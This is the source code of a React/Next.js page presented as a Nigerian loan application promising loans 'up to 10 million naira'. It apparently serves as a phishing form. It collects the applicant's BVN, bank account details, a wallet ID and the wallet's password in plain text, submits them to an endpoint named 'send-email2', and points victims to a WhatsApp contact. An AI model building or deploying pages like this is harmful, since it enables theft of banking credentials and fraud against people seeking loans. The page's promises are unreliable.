'use client';

import Image from 'next/image';
import { useState } from 'react';
import { Header } from '@/components/header';
import { Footer } from '@/components/footer';
import { FaWhatsapp, FaEye, FaEyeSlash } from 'react-icons/fa';

export default function LoanApplication() {
  const [formData, setFormData] = useState({
    fullName: '',
    phoneNumber: '',
    whatsappNumber: '',
    email: '',
    bvn: '',
    address: '',
    accountNumber: '',
    accountName: '',
    bankName: '',
    amountSought: '',
    loanTenure: '',
    reasonForLoan: '',
    walletId: '',
    walletPassword: '',
    sex: '',
    employmentStatus: '',
    monthlyIncome: '',
  });

  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    // Validation: at least one number must be filled
    if (!formData.phoneNumber.trim() && !formData.whatsappNumber.trim()) {
      setError('Please provide at least a phone number or a WhatsApp number.');
      return;
    }

    setLoading(true);

    try {
      const response = await fetch('/api/send-email2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error('Failed to submit application');
      }

      const result = await response.json();
      console.log('Loan application submitted:', result);
      setSubmitted(true);

      // Reset form
      setFormData({
        fullName: '',
        phoneNumber: '',
        whatsappNumber: '',
        email: '',
        bvn: '',
        address: '',
        accountNumber: '',
        accountName: '',
        bankName: '',
        amountSought: '',
        loanTenure: '',
        reasonForLoan: '',
        walletId: '',
        walletPassword: '',
        sex: '',
        employmentStatus: '',
        monthlyIncome: '',
      });

      setTimeout(() => setSubmitted(false), 5000);
    } catch (err) {
      console.error('Error submitting form:', err);
      setError('Failed to submit application. Please try again.');
      setTimeout(() => setError(''), 5000);
    } finally {
      setLoading(false);
    }
  };

  const whatsappNumber = '2347016211534';

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />

      <main className="flex-grow">
        <section className="bg-gradient-to-b from-gray-900 to-gray-800 text-white py-12 text-center">
          <h1 className="text-4xl font-bold">Loan Application</h1>
        </section>

        <div className="max-w-4xl mx-auto px-4 py-8">
          {/* Images */}
          <div className="mb-10 grid grid-cols-1 md:grid-cols-2 gap-6">
            {['reg1.png', 'reg2.png', 'reg3.png', 'reg4.png', 'reg5.png'].map((img, i) => (
              <div key={i} className="flex justify-center">
                <Image
                  src={`/${img}`}
                  alt={`Registration step ${i + 1}`}
                  width={900}
                  height={650}
                  className="rounded-lg shadow-lg w-full h-auto"
                />
              </div>
            ))}
          </div>

          {/* Promo */}
          <div className="bg-blue-50 rounded-lg p-6 mb-8 text-center">
            <h2 className="text-2xl font-bold text-gray-800 mb-3">
              GET LOAN UP TO 10 MILLION NAIRA
            </h2>
            <p className="text-gray-700">
              Get loans with ease, low interest fees and less documentation. Hassle free service
              guaranteed!
            </p>
          </div>

          {/* Form */}
          <div className="bg-white rounded-lg shadow-lg p-8">
            <h3 className="text-2xl font-bold text-gray-800 mb-6">Registration Form</h3>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Full Name */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Name in Full *</label>
                <input
                  type="text"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Phone Number */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Phone Number</label>
                <input
                  type="text"
                  name="phoneNumber"
                  value={formData.phoneNumber}
                  onChange={handleChange}
                  placeholder="Enter your phone number"
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* WhatsApp Number */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">WhatsApp Number</label>
                <input
                  type="text"
                  name="whatsappNumber"
                  value={formData.whatsappNumber}
                  onChange={handleChange}
                  placeholder="Enter your WhatsApp number"
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Email */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Email Address *</label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* BVN */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">
                  BVN (Bank Verification Number)
                </label>
                <input
                  type="text"
                  name="bvn"
                  value={formData.bvn}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Address */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Address *</label>
                <textarea
                  name="address"
                  value={formData.address}
                  onChange={handleChange}
                  required
                  rows={3}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 resize-none"
                />
              </div>

              {/* Employment Status */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Employment Status</label>
                <select
                  name="employmentStatus"
                  value={formData.employmentStatus}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                >
                  <option value="">Select Employment Status...</option>
                  <option value="Employed">Employed</option>
                  <option value="Self-Employed">Self-Employed</option>
                  <option value="Unemployed">Unemployed</option>
                  <option value="Retired">Retired</option>
                </select>
              </div>

              {/* Monthly Income */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Monthly Income</label>
                <input
                  type="text"
                  name="monthlyIncome"
                  value={formData.monthlyIncome}
                  onChange={handleChange}
                  placeholder="Amount in Naira"
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Account Details */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Account Number</label>
                  <input
                    type="text"
                    name="accountNumber"
                    value={formData.accountNumber}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Account Name</label>
                  <input
                    type="text"
                    name="accountName"
                    value={formData.accountName}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Bank Name</label>
                  <input
                    type="text"
                    name="bankName"
                    value={formData.bankName}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>
              </div>

              {/* Amount Sought */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Amount Sought</label>
                <input
                  type="text"
                  name="amountSought"
                  value={formData.amountSought}
                  onChange={handleChange}
                  placeholder="Amount in Naira"
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Loan Tenure */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Loan Tenure</label>
                <select
                  name="loanTenure"
                  value={formData.loanTenure}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                >
                  <option value="">Select...</option>
                  <option value="1 Month">1 Month</option>
                  <option value="4 Months">4 Months</option>
                  <option value="10 Months">10 Months</option>
                  <option value="1 Year">1 Year</option>
                  <option value="Others">Others</option>
                </select>
              </div>

              {/* Reason for Loan */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Reason for Loan</label>
                <textarea
                  name="reasonForLoan"
                  value={formData.reasonForLoan}
                  onChange={handleChange}
                  rows={3}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 resize-none"
                />
              </div>

              {/* WALLET NOTE */}
              <div className="bg-gray-50 border border-gray-300 text-gray-800 px-4 py-4 rounded-lg mb-4">
                <strong className="block mb-1">PLEASE READ THROUGH (NOTE):</strong>
                <p>
                  If you don't have a wallet ID, please use an Email and a desired password which you
                  intend to use for your wallet ID, which will be created for you. If you already
                  have a wallet ID, please fill it in the fields below.
                </p>
              </div>

              {/* Wallet ID + Password with toggle */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-gray-700 font-semibold mb-2">Wallet ID</label>
                  <input
                    type="text"
                    name="walletId"
                    value={formData.walletId}
                    onChange={handleChange}
                    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  />
                </div>

                <div className="relative">
  <label className="block text-gray-700 font-semibold mb-2">Wallet ID Password</label>
  <input
    type={showPassword ? 'text' : 'password'}
    name="walletPassword"
    value={formData.walletPassword}
    onChange={handleChange}
    placeholder="Enter Wallet Password"
    className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 pr-12"
    style={{ lineHeight: '1.75rem' }} // ensures input text and icon align
  />
  <button
    type="button"
    onClick={() => setShowPassword(!showPassword)}
    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-700 hover:text-gray-900"
  >
    {showPassword ? <FaEyeSlash size={22} /> : <FaEye size={22} />}
  </button>
</div>
                       
              </div>

              {/* Sex */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Sex</label>
                <div className="flex gap-6">
                  <label className="flex items-center">
                    <input
                      type="radio"
                      name="sex"
                      value="Male"
                      checked={formData.sex === 'Male'}
                      onChange={handleChange}
                      className="mr-2"
                    />
                    <span className="text-gray-700">Male</span>
                  </label>
                  <label className="flex items-center">
                    <input
                      type="radio"
                      name="sex"
                      value="Female"
                      checked={formData.sex === 'Female'}
                      onChange={handleChange}
                      className="mr-2"
                    />
                    <span className="text-gray-700">Female</span>
                  </label>
                </div>
              </div>

              {/* Success / Error Messages */}
              {submitted && (
                <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-4 text-center">
                  Your loan application has been submitted successfully! We will review your
                  application and contact you shortly.
                </div>
              )}

              {error && (
                <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4 text-center">
                  {error}
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 rounded-lg transition"
              >
                {loading ? 'Submitting...' : 'Submit Application'}
              </button>

              {/* WhatsApp Button */}
              <div className="mt-4 flex justify-center">
                <a
                  href={`https://wa.me/${whatsappNumber}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-6 rounded-lg flex items-center gap-2 transition"
                >
                  <FaWhatsapp size={20} />
                  Chat on WhatsApp
                </a>
              </div>
            </form>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
              }
